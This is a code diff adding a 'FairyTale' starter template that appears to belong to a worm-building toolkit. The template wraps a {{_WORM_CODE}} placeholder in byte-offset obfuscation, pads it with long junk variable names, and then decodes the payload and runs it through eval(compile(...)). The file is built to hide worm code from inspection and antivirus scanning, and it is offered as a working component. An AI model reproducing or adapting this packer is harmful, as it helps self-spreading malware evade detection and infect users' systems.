@@ -1,0 +1,26 @@
+#!name##FairyTale
+#!types##starter
+#!info##Obfuscates python code using byte offset. Additionally, it generates junk variable names.
+#!garbageVar##GAR_func1##256##eye##chars (bytes) length
+#!garbageVar##GAR_code##396##eye##chars (bytes) length
+#!garbageVar##GAR_var1##148##randC##chars (bytes) length
+#!garbageVar##GAR_var2##132##eye##chars (bytes) length
+#!garbageVar##GAR_var3##256##randC##chars (bytes) length
+#!garbageVar##GAR_var4##512##eye##chars (bytes) length
+#!garbageVar##GAR_var5##312##eye##chars (bytes) length
+
+import os
+def {{GAR_func1}}({{GAR_code}}):
+    {{GAR_var5}} = 9
+    while {{GAR_var5}} > 6:
+        {{GAR_var2}}_{{GAR_code}} = {{GAR_code}}.copy()
+        for i in range(len({{GAR_code}})):
+            {{GAR_var2}}_{{GAR_code}}[i] = {{GAR_code}}[len({{GAR_code}}) - i - 1] + 3
+        {{GAR_code}} = {{GAR_var2}}_{{GAR_code}}
+        {{GAR_var5}} -= 1
+    return {{GAR_code}}
+{{GAR_var1}} = r"""{{_WORM_CODE}}"""
+{{GAR_code}}_array = bytearray({{GAR_var1}}, "utf-8")
+{{GAR_var3}}_{{GAR_code}} = {{GAR_func1}}({{GAR_code}}_array)
+{{GAR_var4}} = {{GAR_var3}}_{{GAR_code}}.decode("utf-8")
+eval(compile({{GAR_var4}}, '<string>', 'exec'))
